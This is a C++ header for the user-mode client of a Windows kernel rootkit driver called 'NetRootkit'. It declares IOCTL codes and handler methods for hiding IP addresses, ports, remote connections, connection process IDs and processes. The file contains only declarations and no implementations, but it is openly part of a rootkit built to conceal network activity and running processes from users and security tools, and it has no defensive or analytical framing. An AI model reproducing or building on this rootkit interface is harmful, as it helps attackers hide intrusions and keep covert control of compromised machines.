#pragma once
#include <Windows.h>
#include <winternl.h>
#include <winioctl.h>
#include <ip2string.h>
#include <ws2tcpip.h>
#include <sstream>
#include <iostream>

bool logError(const char* message);
bool logInfo(const char* message);

namespace Driver
{
	constexpr int RootkitDeviceType = 0x8000;
	constexpr int TestConnectionMaxLength = 1024;
	constexpr auto DeviceName = L"\\\\.\\NetRootkit";

	typedef struct _NETHOOK_HIDDEN_CONNECTION {
		ULONG IpAddress;
		USHORT Port;
		ULONG RemoteIpAddress;
		ULONG ConnectPID;
		USHORT _Unknown;	// Future Use
	} NETHOOK_HIDDEN_CONNECTION, * PNETHOOK_HIDDEN_CONNECTION;


	enum class RookitIoctls {
		TestConnection = CTL_CODE(RootkitDeviceType, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS),
		HideIP = CTL_CODE(RootkitDeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS),
		HidePort = CTL_CODE(RootkitDeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS),
		HideRemoteIP = CTL_CODE(RootkitDeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS),
		HideConnectProcessId = CTL_CODE(RootkitDeviceType, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS),
		HideProcessId = CTL_CODE(RootkitDeviceType, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
	};

	class DriverHandler
	{
	public:
		DriverHandler();
		~DriverHandler();

		HANDLE device_handle();

		int CmdCheckConnection(int argc, const char** argv);
		int CmdNetHideIp(int argc, const char** argv);
		int CmdNetHidePort(int argc, const char** argv);
		int CmdNetHideRemoteIp(int argc, const char** argv);
		int CmdNetHideConnectPID(int argc, const char** argv);
		int CmdNetHidePID(int argc, const char** argv);

	private:
		HANDLE device_handle_;
		BOOL check_connection(char* message);
		BOOL hide_ip(const char* message);
		BOOL hide_port(const char* message);
		BOOL hide_remote_ip(const char* message);
		BOOL hide_connect_pid(const char* message); 
		BOOL hide_pid(const char* message);

	};
}
